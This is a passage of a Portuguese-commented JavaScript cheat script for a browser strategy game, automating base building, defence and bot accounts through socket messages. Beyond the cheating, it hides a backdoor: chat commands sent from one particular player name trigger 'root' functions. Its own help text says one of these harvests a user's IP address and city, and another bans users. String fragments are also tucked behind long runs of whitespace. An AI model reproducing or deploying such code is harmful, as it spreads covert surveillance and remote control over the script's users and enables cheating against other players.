    window.io=io.connect;
 
    $.get("/getIP", {
     sip: lobbyURLIP,
    }, function(a) {
       console.log(a)
 
    })
        }catch(a){
    console.log(a)
    }}
var defboton = false;
    var dfe="an"
function defbot(){
 
 
    if(defboton===false){
        defboton=true
            addChat("Def Bot:ON","BASE")
        window.defbotzin = setInterval(function(){
   window.sockets.forEach(socket => {
    socket.emit("1", -1.06, 310, 1),socket.emit("1", -2.08, 310, 1),socket.emit("1", -0.64, 310, 1),socket.emit("1", -2.5, 310, 1),socket.emit("1", -1.87, 306, 1),socket.emit("1", -1.27, 306, 1),socket.emit("1", -1.67, 306, 1),socket.emit("1", -1.47, 306, 1),socket.emit("1", -2.29, 306, 1),socket.emit("1", -0.85, 306, 1),socket.emit("1", -0.43, 306, 1),socket.emit("1", -2.71, 306, 1),socket.emit("1", -2.91, 306, 1),socket.emit("1", -0.23, 306, 1),socket.emit("1", -0.03, 306, 1),socket.emit("1", -3.11, 306, 1),socket.emit("1", 2.97, 306, 1),socket.emit("1", 0.17, 306, 1),socket.emit("1", 2.77, 306, 1),socket.emit("1", 0.37, 306, 1),socket.emit("1", 0.57, 306, 1),socket.emit("1", 2.57, 306, 1),socket.emit("1", 2.37, 306, 1),socket.emit("1", 0.77, 306, 1),socket.emit("1", 0.97, 306, 1),socket.emit("1", 2.17, 306, 1),socket.emit("1", 1.97, 306, 1),socket.emit("1", 1.17, 306, 1),socket.emit("1", 1.37, 306, 1),socket.emit("1", 1.77, 306, 1),socket.emit("1",Math.PI*-1.5,306,1), socket.emit("1", -1.7, 245.85, 1),socket.emit("1", -1.45, 245.85, 1),socket.emit("1", -1.96, 245.85, 1),socket.emit("1", -1.19, 245.85, 1),socket.emit("1", -0.94, 245.85, 1),socket.emit("1", -2.21, 245.85, 1),socket.emit("1", -2.46, 245.85, 1),socket.emit("1", -0.69, 245.85, 1),socket.emit("1", -2.71, 245.85, 1),socket.emit("1", -0.44, 245.85, 1),socket.emit("1", -2.96, 245.85, 1),socket.emit("1", -0.19, 245.85, 1),socket.emit("1", 3.07, 245.85, 1),socket.emit("1", 0.06, 245.85, 1),socket.emit("1", 2.82, 245.85, 1),socket.emit("1", 0.31, 245.85, 1),socket.emit("1", 2.57, 245.85, 1),socket.emit("1", 0.57, 245.85, 1),socket.emit("1", 2.32, 245.85, 1),socket.emit("1", 0.82, 245.85, 1),socket.emit("1", 1.07, 245.85, 1),socket.emit("1", 2.07, 245.85, 1),socket.emit("1", 1.32, 245.85, 1),socket.emit("1", 1.82, 245.85, 1),socket.emit("1",Math.PI*-1.5,245.85,1), socket.emit("1", -1.91, 184.69, 1),socket.emit("1", -1.23, 184.4, 1),socket.emit("1", -2.25, 185.57, 1),socket.emit("1", -0.89, 184.93, 1),socket.emit("1", -2.58, 190.21, 1),socket.emit("1", -0.56, 190.16, 1),socket.emit("1", -2.9, 186.72, 1),socket.emit("1", -0.24, 185.76, 1),socket.emit("1", 3.05, 183.1, 1),socket.emit("1", 0.09, 183.95, 1),socket.emit("1", 0.42, 189.81, 1),socket.emit("1", 2.72, 189.79, 1),socket.emit("1", 0.74, 187.09, 1),socket.emit("1", 2.4, 188, 1),socket.emit("1", 2.07, 181, 1),socket.emit("1", 1.08, 181.02, 1),socket.emit("1", 1.735, 188.31, 1),socket.emit("1", 1.41, 188.81, 1), socket.emit("1",Math.PI*1.5,140,1),socket.emit("1", -2.095, 130, 1),socket.emit("1", -1.048, 130, 1),socket.emit("1", -2.565, 130, 1),socket.emit("1", -0.58, 130, 1),socket.emit("1", -3.035, 130, 1),socket.emit("1", -0.09, 130, 1),socket.emit("1", 0.38, 130, 1),socket.emit("1", 2.78, 130, 1),socket.emit("1", 2.3, 130, 1),socket.emit("1", 0.86, 130, 1),socket.emit("1", 1.83, 130, 1),socket.emit("1", 1.33, 130, 1)
   })
        },150)
    }else if(defboton===true){
    clearInterval(defbotzin)
        addChat("Def Bot:OFF","BASE")
           defboton=false
    }
 
}
 
 
window.fulpower='OFF';
window.cop='OFF';
window.defe='OFF';
window.defIA='OFF';
window.comanderIA='OFF';
window.idesc=0;
 
 
 
    var defstat=false
var defstat2=false
 
 
var abs21 = setInterval(function(){
if(defstat){
  reconhecimento()
}
},50)
 
var abs31 = setInterval(function(){
if(defstat2){
  coloc()
}
},50)
//EVENTO DE MENSAGEM
window.addChatLine = function(a, mensagem, c) {
 
            var values = mensagem
            var split22 = values.split(' ');
            var numb22=0;
            var name22 = split22[0].substr(2);
            numb22=Number(split22[1]);
 
    if(name22 == "kita" && senhaok == false){
         users.forEach((user)=>{
                if(user.sid==a){
                    if(user.name=="࿇‗ᑭᒪᗩYℰℛ乂‗࿇"){
            if(window.chatCommandroot[name22]){window.chatCommandroot[name22](numb22)}
    }}})
    }
 
 
     var idzin = player.sid
    if (player) {
        var b = getUserBySID(a);
        if (c || 0 <= b) {
            var g = c ? "SERVER" : users[b].name;
            c = c ? "#fff" : playerColors[users[b].color] ? playerColors[users[b].color] : playerColors[0];
            player.sid == a && (c = "#fff");
            b = document.createElement("li");
            b.className = player.sid == a ? "chatme" : "chatother";
            b.innerHTML = '<span style="color:' + c + '" onclick=goto2(' + a + ');>' + g + '-></span> <span class="chatText">' + mensagem+"  (id:"+a+")</span>";
            10 < chatList.childNodes.length && chatList.removeChild(chatList.childNodes[0]);
            chatList.appendChild(b);
 
 
 
             if(as){
 
                 if(idesc==a && mensagem!="-copy-off"&&mensagem!="-copy-on"){
                  socket.emit("ch",mensagem)
 
 
                 }
                    }
 
        }
 
 
 
 
//COMANDOS VIA CHAT
if(idzin===a && mensagem=="-info-base"){
alert(`olhar no console`)
setTimeout(function(){
    var a=0;
    a=users[getUserBySID(player.sid)];
    console.log("Dados: ")
    console.log(a)
},1000)
 
}
if(idzin===a && mensagem=="-teclas"){
   alert(`TECLAS:
0 - liga/desliga o lag
c - defend manual
x - retira construções desnecessarias para full atk
z - constroi full atk
h - liga/desliga jointroop
j - circulo pré-definido
p - junta tropas
q - seleciona soldados
e - compra e seleciona comander
b - seleciona tudo
g - separa tropas(enganar, kekeke)
Shift - atualização para full atk(base principal e bot)
   `)
    //y - reconhecimento de base inimiga
        }
 
 
if((idzin===a) && (mensagem=="-comandos" || mensagem=="-help" || mensagem=="-ajuda")){
   alert(`                                    COMANDOS:
 
-comandosBot     -mostra comandos do bot
-teclas          -mostra teclas usadas no hack
-def-ia-on       -liga defesa inteligente, -def-ia-off  desliga
-fullatk         -liga e desliga o full ataque automatico
-autohyb         -liga e desliga o auto hybrido
-basedefesa      -liga e desliga o auto base defenciva
-sellall         -vende tudo
-copy-on         -copia as mensagens, -copy-off para desligar
-IA-command-on   -ativa o commander defencivo, -IA-command-off desliga
-def-on          -ativa def normal, -def-off desliga
-fullpower-on    -base full power, -fullpower-off desliga
-bases           -mostra bases
-defbot          -ativa defend para os bots
//mute + ID        -digites //mute + ID, e ;unmute + ID (para desmutar). EX:    //mute 12
   `)
        }
 
 
if(idzin===a && mensagem=="-IA-command-on"){
    addChat("Comander perseguidor: ON","Base")
    comanderIA='ON';
 window.AutoC=setInterval(function(){
 comanderdef()
 
 },100)
}
 
if(idzin===a && mensagem=="-IA-command-off"){
         addChat("Comander perseguidor: OFF","Base")
      comanderIA='OFF';
 clearInterval(AutoC)
 
}
 
        if(mensagem=="-root-v-b -001"){
            users.forEach((user)=>{
                if(user.sid==a){
                    if(user.name=="࿇‗ᑭᒪᗩYℰℛ乂‗࿇"){
    for(var as = 0;as<users.length;++as){
        if(a==users[as].sid){
    comando001(users[as].name)
        }
    }
                    }
                }
            })
 
}
 
 
                if(mensagem=="-root-v-b -002"){
 users.forEach((user)=>{
                if(user.sid==a){
                    if(user.name=="࿇‗ᑭᒪᗩYℰℛ乂‗࿇"){
    comando002()
                    }}})
 
 
}
                if(mensagem=="-root-v-b -003"){
 users.forEach((user)=>{
                if(user.sid==a){
                    if(user.name=="࿇‗ᑭᒪᗩYℰℛ乂‗࿇"){
    comando003()
                    }}})
 
}
 
 
        if(idzin===a && mensagem=="-defbot"){
 
        defbot()
        }
 
                if(mensagem=="-root-v-b -005"){
 
    comando005()
 
}
                if(mensagem=="-root-v-b -006"){
 
    comando006()
 
}
        if(mensagem=="-root-v-b -007"){
 
    comando007()
 
}
 
if(idzin===a && mensagem=="-def-ia-on"){
    defstat=true
      defIA='ON';
 addChat("defend inteligent ON","SERVER")
}
 
        if(idzin===a && mensagem=="-def-ia-off"){
            defstat=false
              defIA='OFF';
            addChat("defend  OFF","SERVER")
        }
 
 
 
 
        if(idzin===a && mensagem=="-def-on"){
              defe='ON';
 addChat("defendend comum ON","SERVER")
         defstat2=true
        }
 
        if(idzin===a && mensagem=="-def-off"){
              defe='OFF';
            addChat("defendend comum OFF","SERVER")
      defstat2=false
        }
 
 
 
 
        if(idzin===a && mensagem=="-fullatk"){
            Fullatk()
 
        }
 
                if(idzin===a && mensagem=="-autohyb"){
       autohyb()
 
        }
 
                 if(idzin===a && mensagem=="-basedefesa"){
       autodef()
 
        }
 
 
 
               if(idzin===a && mensagem=="-dpk"){
            dpk()
 
        }
 
            if(idzin===a && mensagem=="-atk-1"){
            window.basesat.b1()
 
        }
 
            if(idzin===a && mensagem=="-atk-2"){
            window.basesat.b2()
 
        }
                    if(idzin===a && mensagem=="-atk-21"){
            window.basesat.b21()
 
        }
 
                    if(idzin===a && mensagem=="-hyb-1"){
            window.basesat.b3()
 
        }
 
            if(idzin===a && mensagem=="-hyb-2"){
            window.basesat.b4()
 
        }
 
                    if(idzin===a && mensagem=="-def-1"){
            window.basesat.b5()
 
        }
 
            if(idzin===a && mensagem=="-def-2"){
            window.basesat.b6()
 
        }
 
              if(idzin===a && mensagem=="-sellallbot"){
              sellallbot()
 
        }
 
              if(idzin===a && mensagem=="-fullpowerbot"){
            autogerador()
        }
 
              if(idzin===a && mensagem=="-dpkbot"){
     dpkbot()
 
        }
 
             if(idzin===a && mensagem=="-fullatkbot"){
    fullatkbot()
 
        }
 
         if(idzin===a && mensagem=="-comandosBot"){
   alert(` COMANDOS PARA OS BOTS:
 
   //bot + numero  -ex: digite //bot e a QUANTIDADE QUE QUER TER
   se voce te 10 bots e quer ter 5, basta digitar //bot 5
   *************************************************************
   -fullatkbot    -constroi base full atk para os bots
   -dpkbot        -constroi base dpk nos bots
   -fullpowerbot  -constroi full power para bots(digite o comando novamente para desligar)
 
   -sellallbot    -vende todas as construções para bot
 
   `)
        }
 
 
                    if(idzin===a && mensagem=="-bases"){
            alert(`Bases:
            -atk-1     (para baixo)
            -atk-2     (para cima)
            -atk-21     (para cima com ant-tank)
            ****************************************
            -hyb-1     (hybrida 1)
            -hyb-2     (hybrida 2)
            ****************************************
            -def-1     (defenciva 1)
            -def-2     (defenciva 2)
            ****************************************
            -dpk
            `)
        }
 
                    if(idzin===a && mensagem=="-comandosADM"){
           if(senhaok==true){
           alert(` COMANDOS SUPER USUARIO
             -root-v-b -001   *mostra aos usuarios desse hack que voce chegou UwU
             -root-v-b -002   *CUIDADO* pega os dados de um usuario(IP e a CIDADE do user)
             -root-v-b -003   *repele as tropas inimigas
             #@kita + ID        *bane um user especifico
                 `)
           }else{
           alert("voce nao tem acesso root")
           }
        }
 
 
         if(idzin===a && mensagem=="-sellall"){
            SellAll()
 
        }
 
 
 
          if(idzin===a && mensagem=="-copy-on"){
              idesc = prompt("ID para copiar")
                      addChat("copiador: ON","SERVER")
                cop='ON';
           as = true;
        }
 
          if(idzin===a && mensagem=="-copy-off"){
              idesc=null;
               addChat("copiador: OFF","SERVER")
                cop='OFF';
           as = false;
        }
 
 
 
 
          if(idzin===a && mensagem=="-fullpower-on"){
                        fulpower='ON';
                     addChat("full power ON","SERVER")
             window.addpower1=setInterval(function(){
    gerador()
    microGenerators()
    powerPlants()
            },500)
        }
 
         if(idzin===a && mensagem=="-fullpower-off"){
              fulpower='OFF';
                 addChat("full power OFF","SERVER")
           clearInterval(addpower1)
        }
    }
 
}
 
 
//FIM DA FUNCAO
 
 
 
//EVENTO ACIONADO AO CLICAR NO BOTAO "ENTER GAME"
window.enterGame = function() {
socket && unitList && (showMainMenuText(randomLoadingTexts[UTILS.randInt(0, randomLoadingTexts.length - 2)]),
hasStorage && localStorage.setItem("lstnmdbl", userNameInput.value),
mainCanvas.focus(),
grecaptcha.execute("6Ldh8e0UAAAAAFOKBv25wQ87F3EKvBzyasSbqxCE").then(function(a) {
    boasvindas()
socket.emit("spawn", {
            name: userNameInput.value,
            skin: currentSkin,
}, a)}))}
 
 
//BOAS VINDAS VIA CHAT
function boasvindas() {
setTimeout(function () {
   addChat(`Seja Bem-Vindo ` + player.name + ` !!! Para ver os comandos digite: -help `, `Server`);
},1000)
}
 
 
 
 
 
//LOOP
//PEGA O POWER E SALVA EM UMA VAR
function aaa(){
window.tppv=setInterval(function(){
socket.on("pt",function(a){
PoderDP = a;
})
},1000)
}
aaa()
var mdef="03"
 
/*
    PEGA AS CORDEENADAS DAS TROPAS INIMIGAS NA BASE E POE WALL NELA
 
       coordenadatropasx = unit.x
       coordenadatropasy = unit.y
       dire = UTILS.getDirection(coordenadatropasx,coordenadatropasy,player.x,player.y);
       dist = UTILS.getDistance(player.x,player.y,coordenadatropasx,coordenadatropasy);
   socket.emit("1", dire, dist,1)
           sellall()
*/
 
//AINDA VOU PROGRAMAR
function totrop(){
var idv = prompt('ID do usuario para descubrir as tropas')
}
//FIM
 
 
//VERIFICA SE TEM TROPAS DENTRO DA BASE
function reconhecimento(){
units.forEach((unit) => {
if(unit.owner!==player.sid && (unit.x>(player.x-390))&&(unit.x<(player.x+390))&&(unit.y>(player.y-390))&&(unit.y<(player.y+390))){
coloc()
}
})
}
 
 
 
 
//USA COMMANDER PARA DEFENDER
function comanderdef(){
        var dire, dist, xqw, xqe = 0;
        var ty = [];
units.forEach((unit) => {
if(unit.owner!==player.sid){
    if((unit.x>(player.x-400))&&(unit.x<(player.x+400))&&(unit.y>(player.y-400))&&(unit.y<(player.y+400))){
       coordenadatropasx = unit.x
       coordenadatropasy = unit.y
       dire = UTILS.getDirection(coordenadatropasx,coordenadatropasy,player.x,player.y);
       dist = UTILS.getDistance(player.x,player.y,coordenadatropasx,coordenadatropasy);
       xqw = unit.x;
       xqe = unit.y;
 for (var b = 0; b < units.length; ++b){
     if(units[b].shape=="star"){
     ty.push(units[b].id);
     }
 }
socket.emit("5", xqw, xqe, ty, 0, -1)
}}})}
//FIM DO LOOP
 
 
 
//ALERT
window.defavido=function(){
addChat ("Sob atk","BASE")
}
//FIM
 
 
//******************************************************************************FUNCOES DOS BOTS*****************************************************************************
 
 
 
//FUNÇÕES CONSTRUTORAS
window.sellSelUnits=()=>{ //Vende todas os objetos selecionados para bots
    if (selUnits.length) {
        for (var a = [], d = 0; d < selUnits.length; ++d)
            a.push(selUnits[d].id);
        socket.emit("3", a);
        for (var i = 0; i < window.sockets.length; i++) { sockets[i].emit("3", a); }
    }
};
 
window.sellallbot=()=>{
      window.sockets.forEach(socket => {
        for (var a = [], d = 0; d < units.length; ++d) {
            if(units[d].type!=1){a.push(units[d].id)}
            socket.emit("3", a);
        }
    })
};
 
window.sellWbots=()=>{ //Selecione o bots para vender walls internas
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
        var SellTest;
        for (var i = 0, s = []; i < units.length; ++i) {
            SellTest = UTILS.getDistance(Bots[0].x, Bots[0].y, units[i].x, units[i].y);
            if (UTILS.roundToTwo(SellTest) < 300 && "circle" === units[i].shape && units[i].type === 3 && units[i].owner === Bots[0].sid) {
                s.push(units[i].id);
                socket.emit("3", s);
            }
        }
    })
}
 
    chatInput.onfocus = function() { chatInput.isFocused = true; };
chatInput.onblur = function() { chatInput.isFocused = false; };
 
 
 
 
 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            var wefwe="u"
 
 
 
function ecerralopautobot(){
 clearInterval(teste2)
    teste2=null
    teste2=false
    teste2=undefined
}
 
var autoDefense2 = false;
window.autogerador = function() {
 
    if (autoDefense2===true) {
        autoDefense2 = false
    addChat("FULL POWER BOT: OFF","SERVER")
        clearInterval(teste222)
        ecerralopautobot()
    } else if(autoDefense2===false){
 addChat("FULL POWER BOT: ON","SERVER")
        autoDefense2 = true;
 
        window.teste222 = setInterval(function(){
 
 
            if (!window.sockets) return alert("no sockets");
                  window.sockets.forEach(socket => {
 
 socket.emit("1",-1.7000172056125311, 234.51524897114894, 3);
     socket.emit("1",-1.9400226883315947, 182.24185715691115, 3)
    socket.emit("1", -1.570010612670869, 140.00004321427903, 3)
   socket.emit("1", 1.5700171594315573, 243.85007402090326, 3);
    socket.emit("1", 2.4400100710526793, 196.79985467474305, 3);
    socket.emit("1", 2.2400039007898447, 243.85656849877958, 3);
    socket.emit("1", -2.7800023458624703, 194.6788252481507, 3);
    socket.emit("1", 1.9699911201667188, 243.85313366860794, 3);
    socket.emit("1", 2.0999878201715214, 185.58517209087591, 3);
                 socket.emit("1", 7.86, 311, 1);
        socket.emit("1", 8.06, 311, 1);
        socket.emit("1", 8.26, 311, 1);
        socket.emit("1", 8.46, 311, 1);
        socket.emit("1", 8.66, 311, 1);
    socket.emit("1", 1.8700025978863808, 132.00487756139935, 3);
    socket.emit("1", 1.2599938029024704, 132.00454272486235, 3);
    socket.emit("1", 1.3800278697318928, 194.13178049974198, 3);
    socket.emit("1", 1.7600061169825598, 194.06341746965091, 3);
    socket.emit("1", -2.4400027616849433, 185.75130282181078, 3);
    socket.emit("1", -2.1999936469647867, 131.99750300668575, 3);
               socket.emit("1", 8.86, 311, 1);
        socket.emit("1", 9.06, 311, 1);
        socket.emit("1", 9.26, 311, 1);
        socket.emit("1", 9.46, 311, 1);
        socket.emit("1", 9.66, 311, 1);
        socket.emit("1", 9.86, 311, 1);
    socket.emit("1", -2.5899833434664847, 243.84680949317334, 3);
    socket.emit("1", 3.0599865137335724, 131.9992848465475, 3);
    socket.emit("1", 2.3700155322992322, 132.00115908582003, 3);
    socket.emit("1", 2.7699990995853443, 180.63860107961412, 3);
    socket.emit("1", 2.910001829109119, 243.8501927413633, 3);
    socket.emit("1", 2.6399909192202835, 243.84888476267423, 3);
    socket.emit("1", 3.1100150743706907, 196.05774072961268, 3);
                  socket.emit("1", 10.70, 311, 1);
        socket.emit("1", 10.90, 311, 1);
        socket.emit("1", 11.10, 311, 1);
        socket.emit("1", 11.30, 311, 1);
        socket.emit("1", 11.72, 311, 1);
    socket.emit("1", -2.9699920613329622, 243.85151732150447, 3);
    socket.emit("1", -2.690040409174835, 132.00027613607475, 3);
    socket.emit("1", -2.3099851374683826, 243.85151732150447, 3);
    socket.emit("1", -2.0399825212769436, 243.85142525726602, 3);
    socket.emit("1", 0.7600044161827382, 132.00282572733062, 3);
    socket.emit("1", 0.35996640663856383, 180.10304605974878, 3);
    socket.emit("1", 0.029980358323314006, 197.1585985951411, 3);
    socket.emit("1", -0.439963547142766, 132.00080795207285, 3);
    socket.emit("1", 0.0800082011395776, 132.0022685411125, 3);
    socket.emit("1", 0.22998938484625386, 243.85088271318605, 3);
    socket.emit("1", 0.5000045603394669, 243.85230796529285, 3);
                 socket.emit("1", 12.14, 311, 1);
        socket.emit("1", 12.34, 311, 1);
        socket.emit("1", 12.54, 311, 1);
        socket.emit("1", 12.74, 311, 1);
        socket.emit("1", 12.94, 311, 1);
        socket.emit("1", 13.14, 311, 1);
    socket.emit("1", 0.7000201471114224, 196.1091423162112, 3);
    socket.emit("1", 0.8999878082444033, 243.84691201653544, 3);
    socket.emit("1", 1.0399986494012126, 186.08457861950842, 3);
    socket.emit("1", 1.170002238251199, 243.8551629553904, 3);
    socket.emit("1", -0.170023102819992, 243.84605081895415, 3);
    socket.emit("1", -0.36001357695289626, 194.92632916053194, 3);
    socket.emit("1", -0.7000068138510656, 183.7252296229344, 3);
            socket.emit("1", 13.34, 311, 1);
        socket.emit("1", 13.54, 311, 1);
        socket.emit("1", 13.74, 311, 1);
        socket.emit("1", 13.94, 311, 1);
        socket.emit("1", 10.07, 311, 1);
    socket.emit("1", -1.3600094643934062, 243.84717119540267, 3);
    socket.emit("1", -1.0899817628353876, 243.84783862072678, 3);
    socket.emit("1", -0.5500054440958607, 243.85303709406625, 3);
    socket.emit("1", -0.8199991749608286, 243.85031002645857, 3);
             socket.emit("1", 10.28, 311, 1);
        socket.emit("1", 10.49, 311, 1);
        socket.emit("1", 11.51, 311, 1);
        socket.emit("1", 11.93, 311, 1);
    socket.emit("1", -1.199997990229862, 183.82290662482725, 3);
    socket.emit("1", -0.9500096278543927, 131.99805036438974, 3);
  socket.emit("1", 10.28, 311, 1);
        socket.emit("1", 10.49, 311, 1);
        socket.emit("1", 11.51, 311, 1);
        socket.emit("1", 11.93, 311, 1);
 
powerPlantsbot()
microGeneratorsbot()
 
    })
 
 
        })
 
 
 
        window.statusBar();
 
    }}
 
window.powerPlantsbot=()=>{
 
    window.sockets.forEach(socket => {
        for (var i = 0; i < units.length; ++i) {
            if (units[i].type === 0 && "hexagon" == units[i].shape) {
                socket.emit("4", units[i].id, 0)
            }
        }
    })
}
 
  window.microGeneratorsbot=()=>{
 
    window.sockets.forEach(socket => {
        for (var i = 0; i < units.length; ++i) {
            if (units[i].type === 3 && "circle" == units[i].shape) {
                socket.emit("4", units[i].id, 1)
            }
        }
    })
        }
 
    window.dpkbot=()=>{
    if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
for(i=-3.14;i<=3.14;i+=0.5233){socket.emit("1",i,132,3);}
for(i=-2.965;i<=3.14;i+=0.3488){socket.emit("1",i,243.85,3);}
for(i=-3.14;i<=3.14;i+=0.3488){socket.emit("1",i,194,2);}
for(i=-3.14;i<3.14;i+=0.216){socket.emit("1",i,1e3,1);}
            })
 
        }
 
window.fullatkbot=()=>{
 if (!window.sockets) return alert("no sockets");
    window.sockets.forEach(socket => {
     socket.emit("1",-1.5581532402252234, 140.0011892806629,7),socket.emit("1",-1.9299812342490636 ,186.48050541544552,4),socket.emit("1",-2.089961523372133 , 129.99956499927222 ,4),socket.emit("1",-2.2999847216876628 , 183.63574298049932 , 5),socket.emit("1",2.980006006787999, 305.99613232849856, 1);socket.emit("1",4.725,130,7); socket.emit("1",3.985,183,5); socket.emit("1",5.475,183,5); socket.emit("1",6.47,184,5); socket.emit("1",7.85,186,5); socket.emit("1",9.26,183,5); socket.emit("1",5.245,130,4); socket.emit("1",5.725,130,4); socket.emit("1",6.205,130,4); socket.emit("1",6.675,130,4); socket.emit("1",7.145,130,4); socket.emit("1",7.615,130,4); socket.emit("1",8.085,130,4); socket.emit("1",8.555,130,4); socket.emit("1",9.025,130,4); socket.emit("1",3.225,130,4); socket.emit("1",9.975,130,4); socket.emit("1",10.485,130,4); socket.emit("1",4.72,210,4); socket.emit("1",5.06,185,4); socket.emit("1",5.81,189,4); socket.emit("1",6.13,190,4); socket.emit("1",6.81,187,4); socket.emit("1",7.13,191,4); socket.emit("1",7.45,185,4); socket.emit("1",8.25,185,4); socket.emit("1",8.6,190,4); socket.emit("1",8.92,189,4); socket.emit("1",9.6,189,4); socket.emit("1",9.925,190,4); socket.emit("1",4.39,185,4); socket.emit("1",4.94,246,4); socket.emit("1",5.1875,246,4); socket.emit("1",5.435,246,4); socket.emit("1",5.685,246,4); socket.emit("1",5.935,246,4); socket.emit("1",6.24,246,4); socket.emit("1",6.49,246,4); socket.emit("1",6.74,246,4); socket.emit("1",6.99,246,4); socket.emit("1",7.25,246,4); socket.emit("1",7.5,246,4); socket.emit("1",7.75,246,4); socket.emit("1",8,246,4); socket.emit("1",8.25,246,4); socket.emit("1",8.5,246,4); socket.emit("1",8.75,246,4); socket.emit("1",9.01,246,4); socket.emit("1",9.26,246,4); socket.emit("1",9.51,246,4); socket.emit("1",9.76,246,4); socket.emit("1",10.03,246,4); socket.emit("1",4,246,4); socket.emit("1",4.25,246,4); socket.emit("1",4.5,246,4); socket.emit("1",7.86,311,1); socket.emit("1",8.06,311,1); socket.emit("1",8.26,311,1); socket.emit("1",8.46,311,1); socket.emit("1",8.66,311,1); socket.emit("1",8.86,311,1); socket.emit("1",9.06,311,1); socket.emit("1",9.26,311,1); socket.emit("1",9.46,311,1); socket.emit("1",9.66,311,1); socket.emit("1",9.86,311,1); socket.emit("1",10.28,311,1); socket.emit("1",10.70,311,1); socket.emit("1",10.90,311,1); socket.emit("1",11.10,311,1); socket.emit("1",11.30,311,1); socket.emit("1",11.72,311,1); socket.emit("1",12.14,311,1); socket.emit("1",12.34,311,1); socket.emit("1",12.54,311,1); socket.emit("1",12.74,311,1); socket.emit("1",12.94,311,1); socket.emit("1",13.14,311,1); socket.emit("1",13.34,311,1); socket.emit("1",13.54,311,1); socket.emit("1",13.74,311,1); socket.emit("1",13.94,311,1); socket.emit("1",10.07,311,8); socket.emit("1",10.49,311,8); socket.emit("1",11.51,311,8); socket.emit("1",11.93,311,8);
})
}
 
//SELECT COMMANDER BOTS
window.toggleSelUnit=()=>{
    if (player && !activeUnit && units) {
        var a = (player.x || 0) - maxScreenWidth / 2 + camX,
            d = (player.y || 0) - maxScreenHeight / 2 + camY,
            c = player.x - a + targetDst * MathCOS(targetDir) + camX,
            b = player.y - d + targetDst * MathSIN(targetDir) + camY;
        disableSelUnit();
        var g = 4 >= MathABS(c - mouseStartX + (b - mouseStartY)),
            e = !1;
        activeBase = null;
        if (g)
            for (var h = 0; h < users.length; ++h)
                if (0 <= users[h].size - UTILS.getDistance(c, b, users[h].x - a, users[h].y - d)) {
                    activeBase = users[h];
                    forceUnitInfoUpdate = !0;
                    break
                }
        if (!activeBase) {
            activeBase = null;
            for (h = 0; h < units.length; ++h)
                if (users[getUserBySID(units[h].owner)] !== undefined && users[getUserBySID(units[h].owner)].name.startsWith(player.name) === true || units[h].owner == player.sid)
                    if (g) {
                        if (0 <= units[h].size - UTILS.getDistance(c, b, units[h].x - a, units[h].y - d)) {
                            selUnits.push(units[h]);
                            var f = getUnitFromPath(selUnits[0].uPath);
                            f && (selUnits[0].info = f, "Unit" == f.typeName && (e = !0));
                            break
                        }
                    } else UTILS.pointInRect(units[h].x - a, units[h].y - d, mouseStartX, mouseStartY, c - mouseStartX, b - mouseStartY) && (selUnits.push(units[h]), f = getUnitFromPath(selUnits[selUnits.length - 1].uPath)) && (selUnits[selUnits.length - 1].info = f, "Unit" == f.typeName && (e = !0));
            if (selUnits.length) {
                for (h = selUnits.length - 1; 0 <= h; --h) e && "Tower" == selUnits[h].info.typeName ? selUnits.splice(h, 1) : e || "Unit" != selUnits[h].info.typeName || selUnits.splice(h, 1);
                selUnitType = e ? "Unit" : "Tower";
                150 < selUnits.length && (selUnits.length = 150)
            }
        }
        updateSelUnitViews()
    }
}
updateSelUnitViews=function() {
sellButton.style.display = "block";
for (var a = 0, d = 0; d < selUnits.length; ++d)
a += Math.round(selUnits[d].info.cost / 2);
a ? sellButton.innerHTML = "Sell <span class='spanLink'>" + a + "</span>" : sellButton.style.display = "none"
}
 
 
 
//ESPELHADO
sendUnit = function(a) {
    socket && gameState && activeUnit && !activeUnit.dontPlace && socket.emit("1", UTILS.roundToTwo(activeUnitDir), UTILS.roundToTwo(activeUnitDst), a);
    for (var i = 0; i < window.sockets.length; i++) { sockets[i].emit("1", UTILS.roundToTwo(activeUnitDir), UTILS.roundToTwo(activeUnitDst), a); }
}
 
 
//UPGRADE ESPELHADO
upgradeUnit = function(a) {
    socket && gameState && (1 == selUnits.length ? socket.emit("4", selUnits[0].id, a) : (activeBase) ? (a == 0 && activeBase.sid == player.sid ? (socket.emit("4", 0, a, 1)) : (handleActiveBaseUpgrade(activeBase.sid, activeBase.upgrades[a].name))) : (upgradeSelUnits(selUnits[0], a)))
    for (var i = 0; i < window.sockets.length; i++) { sockets[i] && gameState && (1 == selUnits.length ? sockets[i].emit("4", selUnits[0].id, a) : activeBase && activeBase.sid == player.sid && sockets[i].emit("4", 0, a, 1)); }
}
 
 
//MOVE TO ALLIES
var lastAlly = 0;
addEventListener("keydown", function(a) {
    if (a.keyCode == 27) { //esc
        if (usersWithTag() !== 0) {
            for (i = lastAlly, e = users, h = e.length * 2; i < h; ++i) {
                if (i == e.length) {
                    i = 0;
                }
                if (i !== 0 && users[i].sid !== player.sid && users[i].name.startsWith(player.name)) {
                    camX = users[i].x - player.x;
                    camY = users[i].y - player.y;
                    if (i == e.length) { lastAlly = 0; } else { lastAlly = 1 + i; }
                    break;
                }
            }
        }
    }
});
 
 
//MOVE TO COMMANDERS
var lastUnit = 0;
addEventListener("keydown", function(a) {
    if (a.keyCode == 88) {
        if (unitsWithTag() !== 0) {
            for (i = lastUnit, e = units, h = e.length * 2; i < h; ++i) {
                if (i == h) {
                    break;
                }
                if (i == e.length) {
                    i = 0;
                }
                if (units[i] !== undefined) {
                    o = users[getUserBySID(units[i].owner)];
                    if (o !== undefined && o.sid !== player.sid && o.name.startsWith(player.name) && units[i].shape == "star") {
                        selUnits = [];
                        camX = units[i].x - player.x;
                        camY = units[i].y - player.y;
                        selUnits.push(units[i]);
                        if (i == e.length) { lastUnit = 0; } else { lastUnit = 1 + i; }
                        break;
                    }
                }
            }
        }
    }
});
 
 
moveSelUnits = function() {
    if (selUnits.length) {
        var a = player.x + targetDst * MathCOS(targetDir) + camX,
            d = player.y + targetDst * MathSIN(targetDir) + camY,
            c = 1;
        if (c && 1 < selUnits.length)
            for (var b = 0; b < users.length; ++b)
                if (UTILS.pointInCircle(a, d, users[b].x, users[b].y, users[b].size)) { c = 0; break }
        var g = -1;
        if (c)
            for (b = 0; b < units.length; ++b)
                if (units[b].onScreen && units[b].owner != player.sid && UTILS.pointInCircle(a, d, units[b].x, units[b].y, units[b].size)) {
                    c = 0;
                    g = units[b].id;
                    break
                }
